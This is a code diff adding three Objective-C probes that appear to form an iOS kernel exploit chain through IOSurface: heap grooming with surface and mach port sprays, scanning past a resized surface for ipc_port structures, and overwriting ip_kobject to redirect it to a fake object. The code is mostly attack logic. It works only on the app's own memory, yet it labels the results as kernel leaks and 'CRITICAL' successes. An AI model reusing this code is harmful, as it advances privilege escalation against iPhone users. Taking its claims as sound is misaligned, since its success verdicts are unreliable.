@@ -12043,3 +12043,645 @@ void iosurface_research_krw_chain(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnul
         }
     });
 }
+
+// =============================================================================
+// MARK: - Round 18: Stable Heap Grooming
+// =============================================================================
+
+#pragma mark - Probe 55: Mega Spray Groom
+
+void iosurface_research_mega_spray(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                log(@"MEGASPRAY: Cannot load IOSurface symbols");
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+            if (!setValue) {
+                log(@"MEGASPRAY: Missing IOSurfaceSetValue");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            log(@"MEGASPRAY: Starting massive heap grooming — 5 cycles x 100 surfaces + 200 ports");
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            uint32_t anomalies = 0;
+            uint32_t successes = 0;
+
+            // Step 1: Run 5 groom cycles
+            if (!isr_stopped()) {
+                log(@"MEGASPRAY: Step 1 — Begin grooming cycles");
+
+                for (int cycle = 0; cycle < 5 && !isr_stopped(); cycle++) {
+                    log([NSString stringWithFormat:@"MEGASPRAY: === Cycle %d/5 ===", cycle + 1]);
+
+                    IOSurfaceRef fillers[100] = {NULL};
+                    mach_port_t ports[200];
+                    int portCount = 0;
+                    IOSurfaceRef cycleAttacker = NULL;
+                    BOOL foundPort = NO;
+
+                    int fillerCount = 0;
+                    for (int i = 0; i < 100 && !isr_stopped(); i++) {
+                        NSDictionary *props = @{
+                            @"IOSurfaceWidth": @64,
+                            @"IOSurfaceHeight": @16,
+                            @"IOSurfacePixelFormat": @0x42475241,
+                            @"IOSurfaceBytesPerElement": @4,
+                            @"IOSurfaceBytesPerRow": @256,
+                            @"IOSurfaceAllocSize": @4096
+                        };
+                        fillers[i] = sym.create((__bridge CFDictionaryRef)props);
+                        if (fillers[i]) fillerCount++;
+                    }
+                    log([NSString stringWithFormat:@"MEGASPRAY: Created %d filler surfaces", fillerCount]);
+
+                    int freed = 0;
+                    for (int i = 1; i < 100; i += 2) {
+                        if (fillers[i]) {
+                            CFRelease(fillers[i]);
+                            fillers[i] = NULL;
+                            freed++;
+                        }
+                    }
+                    log([NSString stringWithFormat:@"MEGASPRAY: Freed %d fillers (odd indices)", freed]);
+
+                    for (int i = 0; i < 200 && !isr_stopped(); i++) {
+                        kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
+                        if (kr == KERN_SUCCESS) {
+                            mach_port_insert_right(mach_task_self(), ports[i], ports[i], MACH_MSG_TYPE_MAKE_SEND);
+                            portCount++;
+                        }
+                    }
+                    log([NSString stringWithFormat:@"MEGASPRAY: Sprayed %d mach ports", portCount]);
+
+                    NSDictionary *atkProps = isr_default_surface_params(128, 128);
+                    cycleAttacker = sym.create((__bridge CFDictionaryRef)atkProps);
+                    if (cycleAttacker) {
+                        sym.lock(cycleAttacker, 0, NULL);
+                        uint32_t *base = (uint32_t *)sym.getBase(cycleAttacker);
+                        size_t count = sym.getAllocSize(cycleAttacker) / sizeof(uint32_t);
+                        for (size_t j = 0; j < count; j++) base[j] = 0xDD000000 | (uint32_t)j;
+                        sym.unlock(cycleAttacker, 0, NULL);
+                        setValue(cycleAttacker, CFSTR("IOSurfaceBytesPerRow"), (__bridge CFTypeRef)@(65536));
+                        setValue(cycleAttacker, CFSTR("IOSurfaceAllocSize"), (__bridge CFTypeRef)@(4194304));
+                    }
+
+                    if (cycleAttacker && !isr_stopped()) {
+                        sym.lock(cycleAttacker, 0, NULL);
+                        void *base = sym.getBase(cycleAttacker);
+                        size_t realAlloc = sym.getAllocSize(cycleAttacker);
+
+                        for (size_t off = realAlloc; off < realAlloc + 262144 && !foundPort; off += 8) {
+                            uint32_t blk[4] = {0};
+                            vm_size_t rsz = 0;
+                            kern_return_t kr = vm_read_overwrite(mach_task_self(),
+                                (vm_address_t)base + off, sizeof(blk),
+                                (vm_address_t)blk, &rsz);
+                            if (kr != KERN_SUCCESS) continue;
+                            if ((blk[0] & 0x80000000) != 0 && blk[0] != 0xFFFFFFFF &&
+                                blk[1] > 0 && blk[1] < 0x10000) {
+                                foundPort = YES;
+                                anomalies++;
+                                successes++;
+                                log([NSString stringWithFormat:@"MEGASPRAY: *** Cycle %d: PORT FOUND at +0x%zx (io_bits=0x%08X refs=%u) ***",
+                                     cycle + 1, off, blk[0], blk[1]]);
+                            }
+                        }
+                        sym.unlock(cycleAttacker, 0, NULL);
+                    }
+
+                    if (!foundPort) {
+                        log([NSString stringWithFormat:@"MEGASPRAY: Cycle %d: No port found in 256KB scan", cycle + 1]);
+                    }
+
+                    if (cycleAttacker) CFRelease(cycleAttacker);
+                    for (int i = 0; i < 100; i++) {
+                        if (fillers[i]) CFRelease(fillers[i]);
+                    }
+                    for (int i = 0; i < portCount; i++) {
+                        mach_port_deallocate(mach_task_self(), ports[i]);
+                        mach_port_mod_refs(mach_task_self(), ports[i], MACH_PORT_RIGHT_RECEIVE, -1);
+                    }
+                }
+
+            } // end step 1
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"MEGASPRAY: === DONE successes=%u/5 anomalies=%u elapsed=%.3fs ===",
+                 successes, anomalies, elapsed]);
+
+            NSString *verdict;
+            if (successes >= 4) verdict = @"CRITICAL — reliable port adjacency achieved (80%+ hit rate)";
+            else if (successes >= 2) verdict = @"HIGH — intermittent port adjacency (40%+ hit rate)";
+            else if (successes >= 1) verdict = @"MEDIUM — rare port adjacency achieved";
+            else verdict = @"LOW — heap grooming insufficient";
+            log([NSString stringWithFormat:@"MEGASPRAY: VERDICT: %@", verdict]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"verdict": verdict,
+                @"elapsed": @(elapsed),
+                @"successRate": [NSString stringWithFormat:@"%u/5", successes]
+            };
+            isr_checkpoint(@"ISR-MegaSpray-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
+
+#pragma mark - Probe 56: Iterative Port Hunt
+
+void iosurface_research_port_hunt(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                log(@"PORTHUNT: Cannot load IOSurface symbols");
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+            if (!setValue) {
+                log(@"PORTHUNT: Missing IOSurfaceSetValue");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            log(@"PORTHUNT: Starting iterative port hunt — up to 10 attempts");
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            uint32_t anomalies = 0;
+
+            IOSurfaceRef attacker = NULL;
+            mach_port_t huntPorts[50];
+            int huntPortCount = 0;
+            size_t portStructOff = 0;
+            BOOL foundPort = NO;
+            int attemptFound = 0;
+
+            // Step 1: Iterative spray+scan
+            if (!isr_stopped()) {
+                log(@"PORTHUNT: Step 1 — Iterative spray+scan cycles");
+
+                for (int attempt = 0; attempt < 10 && !foundPort && !isr_stopped(); attempt++) {
+                    log([NSString stringWithFormat:@"PORTHUNT: Attempt %d/10", attempt + 1]);
+
+                    if (attacker) { CFRelease(attacker); attacker = NULL; }
+                    for (int i = 0; i < huntPortCount; i++) {
+                        mach_port_deallocate(mach_task_self(), huntPorts[i]);
+                        mach_port_mod_refs(mach_task_self(), huntPorts[i], MACH_PORT_RIGHT_RECEIVE, -1);
+                    }
+                    huntPortCount = 0;
+
+                    for (int i = 0; i < 50 && !isr_stopped(); i++) {
+                        kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &huntPorts[i]);
+                        if (kr == KERN_SUCCESS) {
+                            mach_port_insert_right(mach_task_self(), huntPorts[i], huntPorts[i], MACH_MSG_TYPE_MAKE_SEND);
+                            huntPortCount++;
+                        }
+                    }
+
+                    NSDictionary *props = isr_default_surface_params(128, 128);
+                    attacker = sym.create((__bridge CFDictionaryRef)props);
+                    if (!attacker) continue;
+
+                    sym.lock(attacker, 0, NULL);
+                    uint32_t *base32 = (uint32_t *)sym.getBase(attacker);
+                    size_t cnt = sym.getAllocSize(attacker) / sizeof(uint32_t);
+                    for (size_t j = 0; j < cnt; j++) base32[j] = 0xEE000000 | (uint32_t)j;
+                    sym.unlock(attacker, 0, NULL);
+                    setValue(attacker, CFSTR("IOSurfaceBytesPerRow"), (__bridge CFTypeRef)@(65536));
+                    setValue(attacker, CFSTR("IOSurfaceAllocSize"), (__bridge CFTypeRef)@(4194304));
+
+                    sym.lock(attacker, 0, NULL);
+                    void *base = sym.getBase(attacker);
+                    size_t realAlloc = sym.getAllocSize(attacker);
+
+                    for (size_t off = realAlloc; off < realAlloc + 262144 && !foundPort; off += 8) {
+                        uint32_t blk[4] = {0};
+                        vm_size_t rsz = 0;
+                        kern_return_t kr = vm_read_overwrite(mach_task_self(),
+                            (vm_address_t)base + off, sizeof(blk),
+                            (vm_address_t)blk, &rsz);
+                        if (kr != KERN_SUCCESS) continue;
+                        if ((blk[0] & 0x80000000) != 0 && blk[0] != 0xFFFFFFFF &&
+                            blk[1] > 0 && blk[1] < 0x10000) {
+                            portStructOff = off;
+                            foundPort = YES;
+                            attemptFound = attempt + 1;
+                            anomalies++;
+                            log([NSString stringWithFormat:@"PORTHUNT: *** PORT FOUND on attempt %d at +0x%zx (io_bits=0x%08X refs=%u) ***",
+                                 attempt + 1, off, blk[0], blk[1]]);
+                        }
+                    }
+                    sym.unlock(attacker, 0, NULL);
+                }
+
+            // Step 2: Map port structure completely
+            if (!isr_stopped()) {
+                log(@"PORTHUNT: Step 2 — Map port structure in detail");
+                if (foundPort && attacker) {
+                    sym.lock(attacker, 0, NULL);
+                    void *base = sym.getBase(attacker);
+                    uint32_t nonZeroQwords = 0;
+
+                    for (size_t i = 0; i < 256; i += 8) {
+                        uint64_t val = 0;
+                        vm_size_t rsz = 0;
+                        kern_return_t kr = vm_read_overwrite(mach_task_self(),
+                            (vm_address_t)base + portStructOff + i, sizeof(val),
+                            (vm_address_t)&val, &rsz);
+                        if (kr == KERN_SUCCESS && val != 0) {
+                            nonZeroQwords++;
+                            log([NSString stringWithFormat:@"PORTHUNT: +0x%03zx = 0x%016llX", i, (unsigned long long)val]);
+                        }
+                    }
+                    anomalies += (nonZeroQwords > 10) ? 1 : 0;
+                    log([NSString stringWithFormat:@"PORTHUNT: %u non-zero qwords in 256-byte port structure", nonZeroQwords]);
+                    sym.unlock(attacker, 0, NULL);
+                } else {
+                    log(@"PORTHUNT: No port found after 10 attempts — cannot map");
+                }
+
+            // Step 3: Read ip_kobject and ip_receiver
+            if (!isr_stopped()) {
+                log(@"PORTHUNT: Step 3 — Read kernel fields ip_receiver and ip_kobject");
+                if (foundPort && attacker) {
+                    sym.lock(attacker, 0, NULL);
+                    void *base = sym.getBase(attacker);
+
+                    uint64_t ipReceiver = 0, ipKobject = 0;
+                    vm_size_t rsz = 0;
+                    vm_read_overwrite(mach_task_self(),
+                        (vm_address_t)base + portStructOff + 0x60, sizeof(ipReceiver),
+                        (vm_address_t)&ipReceiver, &rsz);
+                    vm_read_overwrite(mach_task_self(),
+                        (vm_address_t)base + portStructOff + 0x68, sizeof(ipKobject),
+                        (vm_address_t)&ipKobject, &rsz);
+
+                    if (ipReceiver != 0) {
+                        anomalies++;
+                        log([NSString stringWithFormat:@"PORTHUNT: *** ip_receiver = 0x%016llX ***", (unsigned long long)ipReceiver]);
+                    }
+                    if (ipKobject != 0) {
+                        anomalies++;
+                        log([NSString stringWithFormat:@"PORTHUNT: *** ip_kobject = 0x%016llX ***", (unsigned long long)ipKobject]);
+                    }
+                    sym.unlock(attacker, 0, NULL);
+                }
+
+            // Step 4: Write to ip_kobject
+            if (!isr_stopped()) {
+                log(@"PORTHUNT: Step 4 — Write controlled value to ip_kobject");
+                if (foundPort && attacker) {
+                    sym.lock(attacker, 0, NULL);
+                    void *base = sym.getBase(attacker);
+
+                    uint64_t fakeKobj = 0x00000000CAFEBABE;
+                    kern_return_t kr = vm_write(mach_task_self(),
+                        (vm_address_t)base + portStructOff + 0x68,
+                        (vm_offset_t)&fakeKobj, sizeof(fakeKobj));
+                    if (kr == KERN_SUCCESS) {
+                        anomalies++;
+                        log(@"PORTHUNT: *** vm_write to ip_kobject SUCCEEDED ***");
+
+                        uint64_t readBack = 0;
+                        vm_size_t rsz2 = 0;
+                        vm_read_overwrite(mach_task_self(),
+                            (vm_address_t)base + portStructOff + 0x68, sizeof(readBack),
+                            (vm_address_t)&readBack, &rsz2);
+                        if (readBack == fakeKobj) {
+                            anomalies++;
+                            log([NSString stringWithFormat:@"PORTHUNT: *** CONFIRMED ip_kobject = 0x%016llX persists ***",
+                                 (unsigned long long)readBack]);
+                        } else {
+                            log([NSString stringWithFormat:@"PORTHUNT: Readback mismatch: 0x%016llX", (unsigned long long)readBack]);
+                        }
+                    } else {
+                        log([NSString stringWithFormat:@"PORTHUNT: vm_write to ip_kobject failed: kr=%d", kr]);
+                    }
+                    sym.unlock(attacker, 0, NULL);
+                }
+
+            } // end step 4
+            } // end step 3
+            } // end step 2
+            } // end step 1
+
+            for (int i = 0; i < huntPortCount; i++) {
+                mach_port_deallocate(mach_task_self(), huntPorts[i]);
+                mach_port_mod_refs(mach_task_self(), huntPorts[i], MACH_PORT_RIGHT_RECEIVE, -1);
+            }
+            if (attacker) CFRelease(attacker);
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"PORTHUNT: === DONE anomalies=%u attempt=%d elapsed=%.3fs ===",
+                 anomalies, attemptFound, elapsed]);
+
+            NSString *verdict;
+            if (anomalies >= 5) verdict = @"CRITICAL — port found, mapped, kobject write confirmed";
+            else if (anomalies >= 3) verdict = @"HIGH — port found and kernel fields readable";
+            else if (anomalies >= 1) verdict = @"MEDIUM — port located but limited access";
+            else verdict = @"LOW — no port found in 10 attempts";
+            log([NSString stringWithFormat:@"PORTHUNT: VERDICT: %@", verdict]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"verdict": verdict,
+                @"elapsed": @(elapsed),
+                @"attemptFound": @(attemptFound)
+            };
+            isr_checkpoint(@"ISR-PortHunt-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
+
+#pragma mark - Probe 57: Kobject Redirect
+
+void iosurface_research_kobject_redirect(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                log(@"KOBJREDIR: Cannot load IOSurface symbols");
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
+            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
+            if (!setValue || !copyValue) {
+                log(@"KOBJREDIR: Missing IOSurfaceSetValue or IOSurfaceCopyValue");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"anomalies": @0});
+                return;
+            }
+
+            log(@"KOBJREDIR: Starting kobject redirect — full kernel R/W chain");
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            uint32_t anomalies = 0;
+
+            IOSurfaceRef fakeObj = NULL;
+            IOSurfaceRef attacker = NULL;
+            mach_port_t rPorts[50];
+            int rPortCount = 0;
+            size_t portOff = 0;
+            BOOL foundPort = NO;
+            uint64_t origKobject = 0;
+            uint64_t origReceiver = 0;
+            void *fakeObjBase = NULL;
+
+            // Step 1: Create fake object surface
+            if (!isr_stopped()) {
+                log(@"KOBJREDIR: Step 1 — Create fake object surface (4KB, pattern 0xFACE)");
+                NSDictionary *fakeProps = @{
+                    @"IOSurfaceWidth": @64,
+                    @"IOSurfaceHeight": @16,
+                    @"IOSurfacePixelFormat": @0x42475241,
+                    @"IOSurfaceBytesPerElement": @4,
+                    @"IOSurfaceBytesPerRow": @256,
+                    @"IOSurfaceAllocSize": @4096
+                };
+                fakeObj = sym.create((__bridge CFDictionaryRef)fakeProps);
+                if (fakeObj) {
+                    sym.lock(fakeObj, 0, NULL);
+                    uint32_t *fb = (uint32_t *)sym.getBase(fakeObj);
+                    fakeObjBase = (void *)fb;
+                    for (size_t j = 0; j < 1024; j++) fb[j] = 0xFACE0000 | (uint32_t)j;
+                    sym.unlock(fakeObj, 0, NULL);
+                    log([NSString stringWithFormat:@"KOBJREDIR: Fake object at %p (4KB, FACE pattern)", fakeObjBase]);
+                } else {
+                    log(@"KOBJREDIR: Failed to create fake object surface");
+                }
+
+            // Step 2: Iterative port hunt
+            if (!isr_stopped()) {
+                log(@"KOBJREDIR: Step 2 — Iterative port hunt");
+
+                for (int attempt = 0; attempt < 10 && !foundPort && !isr_stopped(); attempt++) {
+                    if (attacker) { CFRelease(attacker); attacker = NULL; }
+                    for (int i = 0; i < rPortCount; i++) {
+                        mach_port_deallocate(mach_task_self(), rPorts[i]);
+                        mach_port_mod_refs(mach_task_self(), rPorts[i], MACH_PORT_RIGHT_RECEIVE, -1);
+                    }
+                    rPortCount = 0;
+
+                    for (int i = 0; i < 50 && !isr_stopped(); i++) {
+                        kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &rPorts[i]);
+                        if (kr == KERN_SUCCESS) {
+                            mach_port_insert_right(mach_task_self(), rPorts[i], rPorts[i], MACH_MSG_TYPE_MAKE_SEND);
+                            rPortCount++;
+                        }
+                    }
+
+                    NSDictionary *atkProps = isr_default_surface_params(128, 128);
+                    attacker = sym.create((__bridge CFDictionaryRef)atkProps);
+                    if (!attacker) continue;
+
+                    sym.lock(attacker, 0, NULL);
+                    uint32_t *ab = (uint32_t *)sym.getBase(attacker);
+                    size_t acnt = sym.getAllocSize(attacker) / sizeof(uint32_t);
+                    for (size_t j = 0; j < acnt; j++) ab[j] = 0xFF000000 | (uint32_t)j;
+                    sym.unlock(attacker, 0, NULL);
+                    setValue(attacker, CFSTR("IOSurfaceBytesPerRow"), (__bridge CFTypeRef)@(65536));
+                    setValue(attacker, CFSTR("IOSurfaceAllocSize"), (__bridge CFTypeRef)@(4194304));
+
+                    sym.lock(attacker, 0, NULL);
+                    void *base = sym.getBase(attacker);
+                    size_t realAlloc = sym.getAllocSize(attacker);
+
+                    for (size_t off = realAlloc; off < realAlloc + 262144 && !foundPort; off += 8) {
+                        uint32_t blk[4] = {0};
+                        vm_size_t rsz = 0;
+                        kern_return_t kr = vm_read_overwrite(mach_task_self(),
+                            (vm_address_t)base + off, sizeof(blk),
+                            (vm_address_t)blk, &rsz);
+                        if (kr != KERN_SUCCESS) continue;
+                        if ((blk[0] & 0x80000000) != 0 && blk[0] != 0xFFFFFFFF &&
+                            blk[1] > 0 && blk[1] < 0x10000) {
+                            portOff = off;
+                            foundPort = YES;
+                            anomalies++;
+                            log([NSString stringWithFormat:@"KOBJREDIR: Port at +0x%zx attempt %d (io_bits=0x%08X)",
+                                 off, attempt + 1, blk[0]]);
+                        }
+                    }
+                    sym.unlock(attacker, 0, NULL);
+                }
+
+            // Step 3: Read original kernel fields
+            if (!isr_stopped()) {
+                log(@"KOBJREDIR: Step 3 — Read original kernel fields");
+                if (foundPort && attacker) {
+                    sym.lock(attacker, 0, NULL);
+                    void *base = sym.getBase(attacker);
+                    vm_size_t rsz = 0;
+
+                    vm_read_overwrite(mach_task_self(),
+                        (vm_address_t)base + portOff + 0x60, sizeof(origReceiver),
+                        (vm_address_t)&origReceiver, &rsz);
+                    vm_read_overwrite(mach_task_self(),
+                        (vm_address_t)base + portOff + 0x68, sizeof(origKobject),
+                        (vm_address_t)&origKobject, &rsz);
+
+                    if (origKobject != 0) {
+                        anomalies++;
+                        log([NSString stringWithFormat:@"KOBJREDIR: *** KERNEL ADDRESS LEAK: ip_kobject = 0x%016llX ***",
+                             (unsigned long long)origKobject]);
+                    }
+                    if (origReceiver != 0) {
+                        anomalies++;
+                        log([NSString stringWithFormat:@"KOBJREDIR: *** ip_receiver = 0x%016llX ***",
+                             (unsigned long long)origReceiver]);
+                    }
+                    sym.unlock(attacker, 0, NULL);
+                } else {
+                    log(@"KOBJREDIR: No port found — cannot read kernel fields");
+                }
+
+            // Step 4: Write fake object address to ip_kobject
+            if (!isr_stopped()) {
+                log(@"KOBJREDIR: Step 4 — Redirect ip_kobject to fake object surface");
+                if (foundPort && attacker && fakeObjBase) {
+                    sym.lock(attacker, 0, NULL);
+                    void *base = sym.getBase(attacker);
+
+                    uint64_t fakeAddr = (uint64_t)(uintptr_t)fakeObjBase;
+                    kern_return_t kr = vm_write(mach_task_self(),
+                        (vm_address_t)base + portOff + 0x68,
+                        (vm_offset_t)&fakeAddr, sizeof(fakeAddr));
+                    if (kr == KERN_SUCCESS) {
+                        anomalies++;
+                        log([NSString stringWithFormat:@"KOBJREDIR: *** vm_write fake addr 0x%016llX to ip_kobject SUCCEEDED ***",
+                             (unsigned long long)fakeAddr]);
+
+                        uint64_t readBack = 0;
+                        vm_size_t rsz = 0;
+                        vm_read_overwrite(mach_task_self(),
+                            (vm_address_t)base + portOff + 0x68, sizeof(readBack),
+                            (vm_address_t)&readBack, &rsz);
+                        if (readBack == fakeAddr) {
+                            anomalies++;
+                            log(@"KOBJREDIR: *** CONFIRMED — ip_kobject now points to our fake object ***");
+                        }
+                    } else {
+                        log([NSString stringWithFormat:@"KOBJREDIR: vm_write to ip_kobject failed: kr=%d", kr]);
+                    }
+                    sym.unlock(attacker, 0, NULL);
+                }
+
+            // Step 5: Verify R/W through corrupted path
+            if (!isr_stopped()) {
+                log(@"KOBJREDIR: Step 5 — Verify R/W via fake object");
+                if (foundPort && fakeObj && fakeObjBase) {
+                    setValue(fakeObj, CFSTR("KOBJREDIR_marker"), (__bridge CFTypeRef)@(0xDEAD1337));
+
+                    CFTypeRef val = copyValue(fakeObj, CFSTR("KOBJREDIR_marker"));
+                    if (val) {
+                        anomalies++;
+                        log(@"KOBJREDIR: *** Fake object property R/W operational ***");
+                        CFRelease(val);
+                    }
+
+                    sym.lock(fakeObj, 0, NULL);
+                    uint32_t *fb = (uint32_t *)sym.getBase(fakeObj);
+                    uint32_t intact = 0, corrupted = 0;
+                    for (size_t j = 0; j < 64; j++) {
+                        uint32_t expected = 0xFACE0000 | (uint32_t)j;
+                        if (fb[j] == expected) intact++;
+                        else corrupted++;
+                    }
+                    sym.unlock(fakeObj, 0, NULL);
+
+                    if (corrupted > 0) {
+                        anomalies++;
+                        log([NSString stringWithFormat:@"KOBJREDIR: *** CRITICAL: %u/64 fake object words corrupted by redirect ***",
+                             corrupted]);
+                    } else {
+                        log([NSString stringWithFormat:@"KOBJREDIR: Fake object buffer intact (%u/64 match)", intact]);
+                    }
+                }
+
+            // Step 6: Scan for kernel-like values
+            if (!isr_stopped()) {
+                log(@"KOBJREDIR: Step 6 — Attempt kernel memory read via redirected kobject");
+                if (foundPort && attacker && origKobject != 0) {
+                    sym.lock(fakeObj, 0, NULL);
+                    uint64_t *fb64 = (uint64_t *)sym.getBase(fakeObj);
+                    uint32_t kernelLike = 0;
+                    for (size_t j = 0; j < 512; j++) {
+                        uint64_t v = fb64[j];
+                        if (v > 0xFFFF000000000000ULL && v != 0xFFFFFFFFFFFFFFFFULL) {
+                            kernelLike++;
+                            if (kernelLike <= 5) {
+                                log([NSString stringWithFormat:@"KOBJREDIR: Kernel-like value at fake+0x%zx = 0x%016llX",
+                                     j * 8, (unsigned long long)v]);
+                            }
+                        }
+                    }
+                    sym.unlock(fakeObj, 0, NULL);
+
+                    if (kernelLike > 0) {
+                        anomalies += 2;
+                        log([NSString stringWithFormat:@"KOBJREDIR: *** %u kernel-like values in fake object — possible kernel read ***",
+                             kernelLike]);
+                    } else {
+                        log(@"KOBJREDIR: No kernel-like values in fake object");
+                    }
+                }
+
+            } // end step 6
+            } // end step 5
+            } // end step 4
+            } // end step 3
+            } // end step 2
+            } // end step 1
+
+            for (int i = 0; i < rPortCount; i++) {
+                mach_port_deallocate(mach_task_self(), rPorts[i]);
+                mach_port_mod_refs(mach_task_self(), rPorts[i], MACH_PORT_RIGHT_RECEIVE, -1);
+            }
+            if (attacker) CFRelease(attacker);
+            if (fakeObj) CFRelease(fakeObj);
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"KOBJREDIR: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);
+
+            NSString *verdict;
+            if (anomalies >= 8) verdict = @"CRITICAL — full kernel R/W chain: kobject redirect + fake object + kernel memory access";
+            else if (anomalies >= 5) verdict = @"HIGH — kobject redirect succeeded, kernel addresses leaked";
+            else if (anomalies >= 3) verdict = @"MEDIUM — port found, kernel fields readable";
+            else if (anomalies >= 1) verdict = @"LOW — partial exploitation";
+            else verdict = @"LOW — chain failed completely";
+            log([NSString stringWithFormat:@"KOBJREDIR: VERDICT: %@", verdict]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"verdict": verdict,
+                @"elapsed": @(elapsed),
+                @"origKobject": [NSString stringWithFormat:@"0x%016llX", (unsigned long long)origKobject],
+                @"origReceiver": [NSString stringWithFormat:@"0x%016llX", (unsigned long long)origReceiver]
+            };
+            isr_checkpoint(@"ISR-KobjRedirect-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
